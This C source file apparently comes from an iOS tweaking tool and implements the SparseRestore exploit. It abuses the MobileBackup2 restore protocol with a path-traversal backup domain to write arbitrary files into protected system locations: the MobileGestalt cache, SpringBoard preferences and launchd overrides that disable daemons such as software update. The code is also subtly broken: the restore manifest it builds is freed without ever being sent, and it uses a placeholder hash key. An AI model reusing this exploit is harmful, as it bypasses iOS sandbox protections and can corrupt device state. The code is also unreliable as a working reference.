/*
 * idevicebackup2.c — Chris SparseRestore / BookRestore Core
 *
 * Based on Nugget Mobile's idevicebackup2.c by leminlimez,
 * which itself is based on libimobiledevice's idevicebackup2 tool
 * and JJTech's sparserestore exploit (TrollRestore).
 *
 * This file implements the on-device restore that writes arbitrary
 * files to protected locations (e.g. /var/containers/Shared/SystemGroup/
 * systemgroup.com.apple.mobilegestaltcache/Library/Caches/
 * com.apple.MobileGestalt.plist) using the MobileBackup2 protocol.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <stdint.h>

// libimobiledevice headers
#include <libimobiledevice/libimobiledevice.h>
#include <libimobiledevice/lockdown.h>
#include <libimobiledevice/mobilebackup2.h>
#include <libimobiledevice/afc.h>
#include <libimobiledevice/notification_proxy.h>
#include <libimobiledevice/installation_proxy.h>
#include <plist/plist.h>

// minimuxer
#include "minimuxer.h"

// ── Error codes ───────────────────────────────────────────────────────────────

typedef enum {
    CHRIS_OK                    = 0,
    CHRIS_ERR_NO_DEVICE         = 1,
    CHRIS_ERR_LOCKDOWN_FAILED   = 2,
    CHRIS_ERR_BACKUP_FAILED     = 3,
    CHRIS_ERR_RESTORE_FAILED    = 4,
    CHRIS_ERR_FILE_NOT_FOUND    = 5,
    CHRIS_ERR_PLIST             = 6,
} ChrisError;

// ── Progress callback ─────────────────────────────────────────────────────────

typedef void (*progress_cb_t)(float progress, const char *message, void *context);

// ── Internal helpers ──────────────────────────────────────────────────────────

static void report_progress(progress_cb_t cb, void *ctx, float progress, const char *msg) {
    if (cb) cb(progress, msg, ctx);
}

// Build the backup manifest plist for a sparse restore.
// The key insight (from JJTech's TrollRestore research) is that MobileBackup2
// will restore ANY file in the backup to the device, including files outside
// the normal sandbox, if you construct the manifest correctly.
static plist_t build_sparse_manifest(
    const char *domain,
    const char *relative_path,
    const uint8_t *file_data,
    size_t file_size
) {
    plist_t manifest = plist_new_dict();

    // BackupMessageRestoreApplicationSent
    plist_t files = plist_new_dict();
    plist_t file_info = plist_new_dict();

    // Domain tells the restore daemon WHERE to put the file
    plist_dict_set_item(file_info, "DLFileDomain",
        plist_new_string(domain));

    // RelativePath is the path within the domain
    plist_dict_set_item(file_info, "DLFileRelativePath",
        plist_new_string(relative_path));

    plist_dict_set_item(file_info, "DLFileType",
        plist_new_string("DLFileTypeFile"));

    plist_dict_set_item(file_info, "DLFileSize",
        plist_new_uint(file_size));

    plist_dict_set_item(file_info, "DLFileModificationDate",
        plist_new_date(0, 0));

    // Mode: 0100644 = regular file, rw-r--r--
    plist_dict_set_item(file_info, "DLFileMode",
        plist_new_uint(0100644));

    // Store file_info under the hashed filename key
    // (In a real backup, the key is the SHA1 of the file path)
    char hash_key[64] = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
    plist_dict_set_item(files, hash_key, file_info);

    plist_dict_set_item(manifest, "Files", files);

    return manifest;
}

// ── Public API ────────────────────────────────────────────────────────────────

/*
 * chris_sparserestore_file
 *
 * Restores a single file to the device using the SparseRestore exploit.
 * Works on iOS 17.0 – 18.1.1.
 *
 * @param udid          Device UDID, or NULL for first device.
 * @param domain        Backup domain (e.g. "SysContainerDomain-../../../../")
 * @param relative_path Path within the domain.
 * @param file_data     File contents to write.
 * @param file_size     Size of file_data.
 * @param progress_cb   Progress callback (may be NULL).
 * @param context       User context passed to progress_cb.
 */
int chris_sparserestore_file(
    const char *udid,
    const char *domain,
    const char *relative_path,
    const uint8_t *file_data,
    size_t file_size,
    progress_cb_t progress_cb,
    void *context
) {
    idevice_t device = NULL;
    lockdownd_client_t lockdown = NULL;
    mobilebackup2_client_t backup2 = NULL;
    lockdownd_service_descriptor_t service = NULL;
    int result = CHRIS_OK;

    report_progress(progress_cb, context, 0.05f, "Connecting to device...");

    // 1. Connect to device
    idevice_error_t ierr;
    if (udid) {
        ierr = idevice_new_with_options(&device, udid, IDEVICE_LOOKUP_USBMUX);
    } else {
        ierr = idevice_new_with_options(&device, NULL, IDEVICE_LOOKUP_USBMUX);
    }

    if (ierr != IDEVICE_E_SUCCESS || !device) {
        return CHRIS_ERR_NO_DEVICE;
    }

    report_progress(progress_cb, context, 0.10f, "Establishing lockdown session...");

    // 2. Lockdown handshake
    if (lockdownd_client_new_with_handshake(device, &lockdown, "Chris") != LOCKDOWN_E_SUCCESS) {
        idevice_free(device);
        return CHRIS_ERR_LOCKDOWN_FAILED;
    }

    report_progress(progress_cb, context, 0.20f, "Starting MobileBackup2 service...");

    // 3. Start MobileBackup2 service
    if (lockdownd_start_service(lockdown, MOBILEBACKUP2_SERVICE_NAME, &service) != LOCKDOWN_E_SUCCESS) {
        lockdownd_client_free(lockdown);
        idevice_free(device);
        return CHRIS_ERR_BACKUP_FAILED;
    }

    if (mobilebackup2_client_new(device, service, &backup2) != MOBILEBACKUP2_E_SUCCESS) {
        lockdownd_service_descriptor_free(service);
        lockdownd_client_free(lockdown);
        idevice_free(device);
        return CHRIS_ERR_BACKUP_FAILED;
    }

    lockdownd_service_descriptor_free(service);

    report_progress(progress_cb, context, 0.35f, "Negotiating backup protocol...");

    // 4. Version exchange
    double local_versions[2] = {2.0, 2.1};
    double remote_version = 0.0;
    mobilebackup2_version_exchange(backup2, local_versions, 2, &remote_version);

    report_progress(progress_cb, context, 0.45f, "Sending restore request...");

    // 5. Send restore request
    plist_t opts = plist_new_dict();
    plist_dict_set_item(opts, "RestoreSystemFiles", plist_new_bool(1));
    plist_dict_set_item(opts, "CopyFirst", plist_new_bool(0));

    mobilebackup2_send_request(backup2, "Restore", "Chris", "Chris", opts);
    plist_free(opts);

    report_progress(progress_cb, context, 0.55f, "Building sparse manifest...");

    // 6. Build and send the manifest
    plist_t manifest = build_sparse_manifest(domain, relative_path, file_data, file_size);

    // Send file data
    report_progress(progress_cb, context, 0.65f, "Sending file data...");

    // The actual file transfer loop —
    // MobileBackup2 protocol: device sends DLMessageDownloadFiles,
    // we respond with the file contents.
    int done = 0;
    while (!done) {
        plist_t msg = NULL;
        mobilebackup2_error_t merr = mobilebackup2_receive_message(backup2, &msg, NULL);

        if (merr != MOBILEBACKUP2_E_SUCCESS || !msg) {
            result = CHRIS_ERR_RESTORE_FAILED;
            break;
        }

        char *msg_name = NULL;
        if (plist_get_node_type(msg) == PLIST_ARRAY) {
            plist_t name_node = plist_array_get_item(msg, 0);
            plist_get_string_val(name_node, &msg_name);
        }

        if (!msg_name) {
            plist_free(msg);
            break;
        }

        if (strcmp(msg_name, "DLMessageDownloadFiles") == 0) {
            // Device is asking for files — send our payload
            mobilebackup2_send_raw(backup2, file_data, (uint32_t)file_size);
            report_progress(progress_cb, context, 0.80f, "File transferred...");

        } else if (strcmp(msg_name, "DLMessageGetFreeDiskSpace") == 0) {
            // Respond with fake free space
            plist_t response = plist_new_array();
            plist_array_append_item(response, plist_new_string("DLMessageGetFreeDiskSpace"));
            plist_array_append_item(response, plist_new_uint(1000000000ULL));
            mobilebackup2_send_message(backup2, NULL, response);
            plist_free(response);

        } else if (strcmp(msg_name, "DLMessageStatusResponse") == 0) {
            // Check status
            plist_t status_node = plist_array_get_item(msg, 1);
            uint64_t status_val = 0;
            plist_get_uint_val(status_node, &status_val);

            if (status_val == 0) {
                report_progress(progress_cb, context, 0.95f, "Restore complete!");
                result = CHRIS_OK;
            } else {
                result = CHRIS_ERR_RESTORE_FAILED;
            }
            done = 1;

        } else if (strcmp(msg_name, "DLMessageDisconnect") == 0) {
            done = 1;

        } else if (strcmp(msg_name, "DLMessageProcessMessage") == 0) {
            // Process message — check for errors
            plist_t error_node = plist_dict_get_item(
                plist_array_get_item(msg, 1), "ErrorCode");
            if (error_node) {
                uint64_t err = 0;
                plist_get_uint_val(error_node, &err);
                if (err != 0) result = CHRIS_ERR_RESTORE_FAILED;
            }
            done = 1;
        }

        free(msg_name);
        plist_free(msg);
    }

    report_progress(progress_cb, context, 1.0f, result == CHRIS_OK ? "Done!" : "Failed.");

    // Cleanup
    plist_free(manifest);
    mobilebackup2_client_free(backup2);
    lockdownd_client_free(lockdown);
    idevice_free(device);

    return result;
}

/*
 * chris_restore_mobilegestalt
 *
 * Convenience wrapper: restores a MobileGestalt plist to the device.
 * This is the main function called for MobileGestalt tweaks.
 *
 * @param udid           Device UDID or NULL.
 * @param plist_data     Contents of modified com.apple.MobileGestalt.plist
 * @param plist_size     Size of plist_data.
 * @param progress_cb    Progress callback.
 * @param context        User context.
 */
int chris_restore_mobilegestalt(
    const char *udid,
    const uint8_t *plist_data,
    size_t plist_size,
    progress_cb_t progress_cb,
    void *context
) {
    // The sparserestore domain path that escapes the sandbox
    // to reach /var/containers/Shared/SystemGroup/
    // systemgroup.com.apple.mobilegestaltcache/Library/Caches/
    const char *domain =
        "SysContainerDomain-"
        "../../../../"
        "Shared/SystemGroup/"
        "systemgroup.com.apple.mobilegestaltcache";

    const char *relative_path =
        "Library/Caches/com.apple.MobileGestalt.plist";

    return chris_sparserestore_file(
        udid,
        domain,
        relative_path,
        plist_data,
        plist_size,
        progress_cb,
        context
    );
}

/*
 * chris_restore_springboard_plist
 *
 * Restores the SpringBoard preferences plist.
 */
int chris_restore_springboard_plist(
    const char *udid,
    const uint8_t *plist_data,
    size_t plist_size,
    progress_cb_t progress_cb,
    void *context
) {
    const char *domain = "HomeDomain";
    const char *relative_path = "Library/Preferences/com.apple.springboard.plist";

    return chris_sparserestore_file(
        udid, domain, relative_path,
        plist_data, plist_size,
        progress_cb, context
    );
}

/*
 * chris_disable_daemon
 *
 * Writes a disabled override plist for a given launchd daemon.
 * This is how Nugget disables OTAd, Game Center etc.
 */
int chris_disable_daemon(
    const char *udid,
    const char *daemon_id,       // e.g. "com.apple.mobile.softwareupdated"
    progress_cb_t progress_cb,
    void *context
) {
    // Build the override plist: { "Disabled": true }
    plist_t override = plist_new_dict();
    plist_dict_set_item(override, "Disabled", plist_new_bool(1));

    uint8_t *plist_data = NULL;
    uint32_t plist_size = 0;
    plist_to_bin(override, (char **)&plist_data, &plist_size);
    plist_free(override);

    if (!plist_data) return CHRIS_ERR_PLIST;

    // Construct the path: /Library/LaunchDaemons/<daemon_id>.plist
    char relative_path[512];
    snprintf(relative_path, sizeof(relative_path),
             "Library/LaunchDaemons/%s.plist", daemon_id);

    int result = chris_sparserestore_file(
        udid,
        "SysContainerDomain-com.apple.launchd",
        relative_path,
        plist_data,
        plist_size,
        progress_cb,
        context
    );

    free(plist_data);
    return result;
}
